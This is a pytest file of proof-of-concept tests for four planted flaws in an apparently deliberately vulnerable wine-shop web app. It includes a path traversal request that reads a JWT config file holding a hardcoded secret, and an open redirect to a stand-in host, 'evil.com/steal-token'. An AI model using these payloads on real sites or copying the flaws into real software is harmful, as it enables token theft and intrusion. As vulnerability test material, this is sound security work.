"""
Web Vulnerability PoC Tests (Vulnerabilities #13-#16)
"""
import pytest
import requests


class TestDirectoryListing:
    """#13 - Directory Listing on /files/"""

    @pytest.mark.xfail(reason="Only works in Docker (nginx), not with PHP dev server")
    def test_vuln_13_directory_listing(self, base_url):
        """GET /files/ returns an HTML directory listing."""
        r = requests.get(f"{base_url}/files/")
        assert r.status_code == 200
        assert "Index of" in r.text or "autoindex" in r.text.lower() or "<a href" in r.text, \
            "Directory listing not returned"


class TestPathTraversal:
    """#14 - Path Traversal on GET /wines/export/:filename"""

    @pytest.mark.xfail(reason="PHP dev server blocks path traversal; works in Docker/nginx")
    def test_vuln_14_path_traversal(self, base_url):
        """../api/config/jwt.php leaks the JWT secret key."""
        import urllib.request
        req = urllib.request.Request(f"{base_url}/wines/export/..%2Fapi/config/jwt.php")
        try:
            resp = urllib.request.urlopen(req)
            import json
            data = json.loads(resp.read())
            assert data["success"] is True, f"Path traversal failed: {data}"
            content = data.get("content", "")
            assert "pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI" in content, \
                "JWT secret not found in traversed file content"
        except Exception as e:
            pytest.fail(f"Path traversal request failed: {e}")


class TestOpenRedirect:
    """#15 - Open Redirect on POST /auth/login (redirect parameter)"""

    def test_vuln_15_open_redirect(self, base_url):
        """Login with redirect=https://evil.com returns the URL unvalidated."""
        r = requests.post(f"{base_url}/auth/login", json={
            "email": "joe@example.com",
            "password": "password123",
            "redirect": "https://evil.com/steal-token",
        })
        data = r.json()
        assert data["success"] is True
        assert data.get("redirect_url") == "https://evil.com/steal-token", \
            f"Open redirect not returned: {data}"


class TestMissingSecurityHeaders:
    """#16 - Missing Security Headers (HSTS, X-Content-Type-Options)"""

    def test_vuln_16_missing_hsts(self, base_url):
        """Strict-Transport-Security header is absent."""
        r = requests.get(f"{base_url}/wines")
        assert "Strict-Transport-Security" not in r.headers, \
            "HSTS header is present (should be missing for this vuln)"

    def test_vuln_16_missing_content_type_options(self, base_url):
        """X-Content-Type-Options header is absent."""
        r = requests.get(f"{base_url}/wines")
        assert "X-Content-Type-Options" not in r.headers, \
            "X-Content-Type-Options header is present (should be missing for this vuln)"
